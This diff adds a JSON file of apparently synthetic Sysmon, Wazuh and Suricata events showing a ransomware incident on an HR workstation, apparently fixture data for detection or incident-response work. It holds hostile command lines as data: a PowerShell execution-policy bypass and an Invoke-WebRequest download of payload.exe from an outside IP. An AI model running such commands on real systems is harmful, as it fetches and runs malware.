@@ -1,0 +1,220 @@
+[
+  {
+    "source": "sysmon",
+    "event_id": 1,
+    "timestamp": "2026-07-03T14:30:15Z",
+    "host": "HR-WORKSTATION-04",
+    "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\temp\\update.ps1",
+    "user": "HR-WORKSTATION-04\\jsmith",
+    "src_ip": null,
+    "dest_ip": null,
+    "raw": {
+      "EventID": 1,
+      "UtcTime": "2026-07-03T14:30:15Z",
+      "Computer": "HR-WORKSTATION-04",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\temp\\update.ps1",
+      "User": "HR-WORKSTATION-04\\jsmith"
+    }
+  },
+  {
+    "source": "wazuh",
+    "timestamp": "2026-07-03T14:30:18Z",
+    "host": "HR-WORKSTATION-04",
+    "rule_description": "PowerShell script execution with bypass policy",
+    "rule_level": 8,
+    "rule_groups": [
+      "windows",
+      "powershell",
+      "execution"
+    ],
+    "raw": {
+      "timestamp": "2026-07-03T14:30:18Z",
+      "agent": {
+        "name": "HR-WORKSTATION-04"
+      },
+      "rule": {
+        "description": "PowerShell script execution with bypass policy",
+        "level": 8,
+        "groups": [
+          "windows",
+          "powershell",
+          "execution"
+        ]
+      }
+    }
+  },
+  {
+    "source": "sysmon",
+    "event_id": 7,
+    "timestamp": "2026-07-03T14:31:22Z",
+    "host": "HR-WORKSTATION-04",
+    "process": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "cmd.exe /c whoami",
+    "user": "HR-WORKSTATION-04\\jsmith",
+    "src_ip": null,
+    "dest_ip": null,
+    "raw": {
+      "EventID": 7,
+      "UtcTime": "2026-07-03T14:31:22Z",
+      "Computer": "HR-WORKSTATION-04",
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd.exe /c whoami",
+      "User": "HR-WORKSTATION-04\\jsmith"
+    }
+  },
+  {
+    "source": "sysmon",
+    "event_id": 3,
+    "timestamp": "2026-07-03T14:32:45Z",
+    "host": "HR-WORKSTATION-04",
+    "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe Invoke-WebRequest -Uri http://185.233.100.44/payload.exe -OutFile C:\\Temp\\payload.exe",
+    "user": "HR-WORKSTATION-04\\jsmith",
+    "src_ip": "10.0.15.42",
+    "dest_ip": "185.233.100.44",
+    "raw": {
+      "EventID": 3,
+      "UtcTime": "2026-07-03T14:32:45Z",
+      "Computer": "HR-WORKSTATION-04",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "SourceIp": "10.0.15.42",
+      "DestinationIp": "185.233.100.44",
+      "User": "HR-WORKSTATION-04\\jsmith"
+    }
+  },
+  {
+    "source": "suricata",
+    "timestamp": "2026-07-03T14:32:47.110Z",
+    "src_ip": "10.0.15.42",
+    "dest_ip": "185.233.100.44",
+    "signature": "ET MALWARE Windows EXE Download",
+    "category": "Malware Command and Control",
+    "severity": 1,
+    "raw": {
+      "timestamp": "2026-07-03T14:32:47.110Z",
+      "event_type": "alert",
+      "src_ip": "10.0.15.42",
+      "dest_ip": "185.233.100.44",
+      "alert": {
+        "signature": "ET MALWARE Windows EXE Download",
+        "category": "Malware Command and Control",
+        "severity": 1
+      }
+    }
+  },
+  {
+    "source": "sysmon",
+    "event_id": 1,
+    "timestamp": "2026-07-03T14:33:10Z",
+    "host": "HR-WORKSTATION-04",
+    "process": "C:\\Temp\\payload.exe",
+    "command_line": "C:\\Temp\\payload.exe -encrypt",
+    "user": "HR-WORKSTATION-04\\jsmith",
+    "src_ip": null,
+    "dest_ip": null,
+    "raw": {
+      "EventID": 1,
+      "UtcTime": "2026-07-03T14:33:10Z",
+      "Computer": "HR-WORKSTATION-04",
+      "Image": "C:\\Temp\\payload.exe",
+      "CommandLine": "C:\\Temp\\payload.exe -encrypt",
+      "User": "HR-WORKSTATION-04\\jsmith"
+    }
+  },
+  {
+    "source": "wazuh",
+    "timestamp": "2026-07-03T14:33:15Z",
+    "host": "HR-WORKSTATION-04",
+    "rule_description": "Suspicious executable process creation in temp directory",
+    "rule_level": 12,
+    "rule_groups": [
+      "windows",
+      "malware",
+      "execution"
+    ],
+    "raw": {
+      "timestamp": "2026-07-03T14:33:15Z",
+      "agent": {
+        "name": "HR-WORKSTATION-04"
+      },
+      "rule": {
+        "description": "Suspicious executable process creation in temp directory",
+        "level": 12,
+        "groups": [
+          "windows",
+          "malware",
+          "execution"
+        ]
+      }
+    }
+  },
+  {
+    "source": "sysmon",
+    "event_id": 11,
+    "timestamp": "2026-07-03T14:35:30Z",
+    "host": "HR-WORKSTATION-04",
+    "process": "C:\\Temp\\payload.exe",
+    "command_line": "C:\\Temp\\payload.exe",
+    "user": "HR-WORKSTATION-04\\jsmith",
+    "src_ip": null,
+    "dest_ip": null,
+    "target_filename": "C:\\Users\\jsmith\\Documents\\*.docx",
+    "raw": {
+      "EventID": 11,
+      "UtcTime": "2026-07-03T14:35:30Z",
+      "Computer": "HR-WORKSTATION-04",
+      "Image": "C:\\Temp\\payload.exe",
+      "TargetFilename": "C:\\Users\\jsmith\\Documents\\*.docx",
+      "User": "HR-WORKSTATION-04\\jsmith"
+    }
+  },
+  {
+    "source": "wazuh",
+    "timestamp": "2026-07-03T14:35:35Z",
+    "host": "HR-WORKSTATION-04",
+    "rule_description": "Mass file encryption detected - possible ransomware",
+    "rule_level": 14,
+    "rule_groups": [
+      "windows",
+      "ransomware",
+      "impact"
+    ],
+    "raw": {
+      "timestamp": "2026-07-03T14:35:35Z",
+      "agent": {
+        "name": "HR-WORKSTATION-04"
+      },
+      "rule": {
+        "description": "Mass file encryption detected - possible ransomware",
+        "level": 14,
+        "groups": [
+          "windows",
+          "ransomware",
+          "impact"
+        ]
+      }
+    }
+  },
+  {
+    "source": "sysmon",
+    "event_id": 3,
+    "timestamp": "2026-07-03T14:36:00Z",
+    "host": "HR-WORKSTATION-04",
+    "process": "C:\\Temp\\payload.exe",
+    "command_line": "C:\\Temp\\payload.exe",
+    "user": "HR-WORKSTATION-04\\jsmith",
+    "src_ip": "10.0.15.42",
+    "dest_ip": "192.168.1.100",
+    "raw": {
+      "EventID": 3,
+      "UtcTime": "2026-07-03T14:36:00Z",
+      "Computer": "HR-WORKSTATION-04",
+      "Image": "C:\\Temp\\payload.exe",
+      "SourceIp": "10.0.15.42",
+      "DestinationIp": "192.168.1.100",
+      "User": "HR-WORKSTATION-04\\jsmith"
+    }
+  }
+]
